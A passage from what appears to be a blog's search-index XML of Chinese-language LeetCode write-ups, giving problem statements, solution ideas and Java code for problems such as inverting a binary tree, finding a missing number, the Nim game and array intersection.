&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (hashSet.contains(temp)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            hashSet.add(temp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取下一个快乐的数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> num</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">getNext</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            result += (num % <span class="number">10</span>) * (num % <span class="number">10</span>);</span><br><span class="line">            num = num / <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>快乐数</tag>
      </tags>
  </entry>
  <entry>
    <title>226. 翻转二叉树</title>
    <url>/2018/08/29/LeetCode/leetcode-000226.%20%E7%BF%BB%E8%BD%AC%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>翻转一棵二叉树。<br><strong>示例：</strong><br>输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">     4</span><br><span class="line">   &#x2F;   \</span><br><span class="line">  2     7</span><br><span class="line"> &#x2F; \   &#x2F; \</span><br><span class="line">1   3 6   9</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">     4</span><br><span class="line">   &#x2F;   \</span><br><span class="line">  7     2</span><br><span class="line"> &#x2F; \   &#x2F; \</span><br><span class="line">9   6 3   1</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>递归</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">exchange</span><span class="params">(TreeNode root)</span></span>&#123;</span><br><span class="line">	    TreeNode node = root;</span><br><span class="line">	    <span class="keyword">if</span>(node != <span class="keyword">null</span>)&#123;</span><br><span class="line">	        TreeNode temp = node.left;</span><br><span class="line">	        node.left = node.right;</span><br><span class="line">	        node.right = temp;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125; </span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> TreeNode <span class="title">invertTree</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">		TreeNode node = root;</span><br><span class="line">	    </span><br><span class="line">		<span class="keyword">if</span>(root == <span class="keyword">null</span>) &#123;</span><br><span class="line">	        <span class="keyword">return</span> root;</span><br><span class="line">	    &#125;</span><br><span class="line">	    </span><br><span class="line">	    invertTree(node.left);</span><br><span class="line">	    invertTree(node.right);</span><br><span class="line">	    exchange(node);</span><br><span class="line">	    <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>258. 各位相加</title>
    <url>/2018/08/29/LeetCode/leetcode-000258.%20%E5%90%84%E4%BD%8D%E7%9B%B8%E5%8A%A0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个非负整数 <code>num</code>，反复将各个位上的数字相加，直到结果为一位数。<br><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 38</span><br><span class="line">输出: 2 </span><br><span class="line">解释: 各位相加的过程为：3 + 8 &#x3D; 11, 1 + 1 &#x3D; 2。 由于 2 是一位数，所以返回 2。</span><br></pre></td></tr></table></figure>
<p><strong>进阶：</strong>你可以不使用循环或者递归，且在 O(1) 时间复杂度内解决这个问题吗？</p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>参考的是：<a href="https://my.oschina.net/Tsybius2014/blog/497645" target="_blank" rel="noopener">https://my.oschina.net/Tsybius2014/blog/497645</a></p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">addDigits</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (num &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> + ((num - <span class="number">1</span>) % <span class="number">9</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>268. 缺失数字</title>
    <url>/2018/08/29/LeetCode/leetcode-000268.%20%E7%BC%BA%E5%A4%B1%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个包含 <code>0, 1, 2, ..., n</code> 中 n 个数的序列，找出 0 .. n 中没有出现在序列中的那个数。<br><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [3,0,1]</span><br><span class="line">输出: 2</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [9,6,4,2,3,5,7,0,1]</span><br><span class="line">输出: 8</span><br></pre></td></tr></table></figure>
<p><strong>说明：</strong><br>你的算法应具有线性时间复杂度。你能否仅使用额外常数空间来实现?</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>一个0-n的n个数列，每个数字只出现一个，只缺失了一个数字。用0-n这n+1和数字的和减去0-n这n个数字的和，差就是缺失的数字了。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">missingNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum = Arrays.stream(nums).sum();</span><br><span class="line">        <span class="keyword">int</span> ssum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt;= nums.length;i++) &#123;</span><br><span class="line">        	ssum += i;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ssum - sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：使用额外数组（不符合题目要求）"><a href="#解法二：使用额外数组（不符合题目要求）" class="headerlink" title="解法二：使用额外数组（不符合题目要求）"></a>解法二：使用额外数组（不符合题目要求）</h3><p>使用一个长为n+1的数组，如果某个位置上的数字出现了，则该位置对应的值置为1。最后遍历该数字，找到为0的位置，就是缺失的数字。</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">missingNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span>[] numss = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length + <span class="number">1</span>];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">			numss[nums[i]] = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; numss.length;i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (numss[i] == <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> i;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：排序"><a href="#解法三：排序" class="headerlink" title="解法三：排序"></a>解法三：排序</h3><p>对原数组进行排序，然后扫描该数组，得到缺失的值即可。</p>
<p>这里需要对首尾两处的值做特殊处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">missingNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		Arrays.sort(nums);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 判断 n 是否出现在末位</span></span><br><span class="line">        <span class="keyword">if</span> (nums[nums.length - <span class="number">1</span>] != nums.length) &#123;</span><br><span class="line">            <span class="keyword">return</span> nums.length;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[<span class="number">0</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 判断 0 是否出现在首位</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (i != nums[i]) &#123;</span><br><span class="line">				<span class="keyword">return</span> i;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法四：使用HashSet"><a href="#解法四：使用HashSet" class="headerlink" title="解法四：使用HashSet"></a>解法四：使用HashSet</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">missingNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Set&lt;Integer&gt; numSet = <span class="keyword">new</span> HashSet&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) numSet.add(num);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> expectedNumCount = nums.length + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> number = <span class="number">0</span>; number &lt; expectedNumCount; number++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!numSet.contains(number)) &#123;</span><br><span class="line">                <span class="keyword">return</span> number;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法五：异或位运算"><a href="#解法五：异或位运算" class="headerlink" title="解法五：异或位运算"></a>解法五：异或位运算</h3><p>数组是从0到n中有一个缺失，那么根据异或的特性，在遍历这个数据的时候，同时异或index和nums[index]的话，那些出现两次的数字就会消失，最后只剩下出现一次的缺失数字。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">missingNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    	<span class="comment">// 初始化为n，因为循环中i无法到达n，只能到达n-1</span></span><br><span class="line">		<span class="keyword">int</span> result = nums.length;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">			result ^= i ^ nums[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title>292. Nim游戏</title>
    <url>/2018/08/29/LeetCode/leetcode-000292.%20Nim%E6%B8%B8%E6%88%8F/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>你和你的朋友，两个人一起玩 Nim游戏：桌子上有一堆石头，每次你们轮流拿掉 1 - 3 块石头。 拿掉最后一块石头的人就是获胜者。你作为先手。</p>
<p>你们是聪明人，每一步都是最优解。 编写一个函数，来判断你是否可以在给定石头数量的情况下赢得游戏。<br><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 4</span><br><span class="line">输出: false </span><br><span class="line">解释: 如果堆中有 4 块石头，那么你永远不会赢得比赛；</span><br><span class="line">     因为无论你拿走 1 块、2 块 还是 3 块石头，最后一块石头总是会被你的朋友拿走。</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>如果整数能被4整除，则无法胜利</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public boolean canWinNim(int n) &#123;</span><br><span class="line">        return n % 4 !&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>344. 反转字符串</title>
    <url>/2018/08/29/LeetCode/leetcode-000344.%20%E5%8F%8D%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>编写一个函数，其作用是将输入的字符串反转过来。<br><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;hello&quot;</span><br><span class="line">输出: &quot;olleh&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;A man, a plan, a canal: Panama&quot;</span><br><span class="line">输出: &quot;amanaP :lanac a ,nalp a ,nam A&quot;</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>借助StringBuilder翻转</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">reverseString</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder(s.length());</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = s.length() - <span class="number">1</span>;i &gt;= <span class="number">0</span>;i--) &#123;</span><br><span class="line">        	sb.append(s.charAt(i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>349. 两个数组的交集</title>
    <url>/2018/08/29/LeetCode/leetcode-000349.%20%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9A%84%E4%BA%A4%E9%9B%86/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个数组，编写一个函数来计算它们的交集。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: nums1 &#x3D; [1,2,2,1], nums2 &#x3D; [2,2]</span><br><span class="line">输出: [2]</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: nums1 &#x3D; [4,9,5], nums2 &#x3D; [9,4,9,8,4]</span><br><span class="line">输出: [9,4]</span><br></pre></td></tr></table></figure>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明:"></a>说明:</h2><ul>
<li>输出结果中的每个元素一定是唯一的。</li>
<li>我们可以不考虑输出结果的顺序。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：使用一个HashSet"><a href="#解法一：使用一个HashSet" class="headerlink" title="解法一：使用一个HashSet"></a>解法一：使用一个HashSet</h3><p>数组中元素不是唯一的，因此，两个数组的交集可能存在不唯一的数字，因此，使用了一个HashSet来去重。<br>整体思路是将两个数组排序，从第一个开始对比，如果相等，则同时进1，如果A[indexA] &gt; B[indexB]，则B索引进1,否则A索引进1。</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] intersection(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span>[] nums2) &#123;</span><br><span class="line">		Arrays.sort(nums1);</span><br><span class="line">		Arrays.sort(nums2);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> length1 = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> length2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		HashSet&lt;Integer&gt; result = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">while</span> (length1 &lt; nums1.length &amp;&amp; length2 &lt; nums2.length) &#123;</span><br><span class="line">			<span class="keyword">if</span> (nums1[length1] == nums2[length2]) &#123;</span><br><span class="line">				result.add(nums1[length1]);</span><br><span class="line">				length1++;</span><br><span class="line">				length2++;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums1[length1] &lt; nums2[length2]) &#123;</span><br><span class="line">				length1++;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				length2++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> array[] = <span class="keyword">new</span> <span class="keyword">int</span>[result.size()];</span><br><span class="line">		<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> value : result) &#123;</span><br><span class="line">			array[i] = value;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> array;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：使用两个HashSet"><a href="#解法二：使用两个HashSet" class="headerlink" title="解法二：使用两个HashSet"></a>解法二：使用两个HashSet</h3><p>将nums1和nums2的数据都保存到set1和set2中，然后利用HashSet的retainAll方法，求它们的交集，输出即可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] intersection(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span>[] nums2) &#123;</span><br><span class="line">		HashSet&lt;Integer&gt; set1 = <span class="keyword">new</span> HashSet&lt;&gt;(nums1.length);</span><br><span class="line">		HashSet&lt;Integer&gt; set2 = <span class="keyword">new</span> HashSet&lt;&gt;(nums2.length);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> num : nums1) &#123;</span><br><span class="line">			set1.add(num);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> num : nums2) &#123;</span><br><span class="line">			set2.add(num);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		set1.retainAll(set2);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> set1.stream().mapToInt(a -&gt; a).toArray();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h3><p>对nums1进行排序，然后遍历nums2，对每个在nums2中的数字，在nums1中二分查找，存在就保存到set中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] intersection(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span>[] nums2) &#123;</span><br><span class="line">		HashSet&lt;Integer&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">		Arrays.sort(nums1);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> num : nums2) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="number">0</span> &lt;= Arrays.binarySearch(nums1, num)) &#123;</span><br><span class="line">				set.add(num);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> set.stream().mapToInt(a -&gt; a).toArray();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>371. 两整数之和</title>
    <url>/2018/08/29/LeetCode/leetcode-000371.%20%E4%B8%A4%E6%95%B4%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>不使用运算符 <code>+</code> 和<code>-</code>，计算两整数<code>a</code> 、<code>b</code>之和。<br><strong>示例：</strong><br>若 a = 1 ，b = 2，返回 3。</p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>使用位运算</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSum</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">if</span>(a == <span class="number">0</span>) &#123;</span><br><span class="line">    		<span class="keyword">return</span> b;</span><br><span class="line">    	&#125;</span><br><span class="line">    	</span><br><span class="line">        <span class="keyword">if</span>(b == <span class="number">0</span>) &#123;</span><br><span class="line">        	<span class="keyword">return</span> a;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> x = a ^ b;</span><br><span class="line">        <span class="keyword">int</span> y = (a &amp; b) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> getSum(x, y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>389. 找不同</title>
    <url>/2018/08/29/LeetCode/leetcode-000389.%20%E6%89%BE%E4%B8%8D%E5%90%8C/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个字符串 <code>s</code> 和 <code>t</code>，它们只包含小写字母。</p>
<p>字符串 <code>t</code> 由字符串 <code>s</code> 随机重排，然后在随机位置添加一个字母。</p>
<p>请找出在 <code>t</code> 中被添加的字母。<br><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：</span><br><span class="line">s &#x3D; &quot;abcd&quot;</span><br><span class="line">t &#x3D; &quot;abcde&quot;</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">e</span><br><span class="line"></span><br><span class="line">解释：</span><br><span class="line">&#39;e&#39; 是那个被添加的字母。</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>这道题目可以转化为一个列表，其中有一个字符只出现了一次，其余的字符均出现两次的问题。将字符转换为char，使用异或即可。</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">findTheDifference</span><span class="params">(String s, String t)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">char</span> tmp = <span class="number">0x00</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; s.length();i++) &#123;</span><br><span class="line">        	tmp =(<span class="keyword">char</span>)(tmp ^ s.charAt(i));</span><br><span class="line">        &#125;</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; t.length();i++) &#123;</span><br><span class="line">            tmp = (<span class="keyword">char</span>)(tmp ^ t.charAt(i));</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>461. 汉明距离</title>
    <url>/2018/08/29/LeetCode/leetcode-000461.%20%E6%B1%89%E6%98%8E%E8%B7%9D%E7%A6%BB/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>两个整数之间的汉明距离指的是这两个数字对应二进制位不同的位置的数目。</p>
<p>给出两个整数 <code>x</code> 和 <code>y</code>，计算它们之间的汉明距离。</p>
<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>0 ≤ <code>x</code>, <code>y</code> &lt; 2^31.</p>
<h2 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: x &#x3D; 1, y &#x3D; 4</span><br><span class="line"></span><br><span class="line">输出: 2</span><br><span class="line"></span><br><span class="line">解释:</span><br><span class="line">1   (0 0 0 1)</span><br><span class="line">4   (0 1 0 0)</span><br><span class="line">       ↑   ↑</span><br><span class="line"></span><br><span class="line">上面的箭头指出了对应二进制位不同的位置。</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>现将两个整数转换为二进制字符串，然后填充0至一样的长度，按照位计算不同的个数即可。</p>
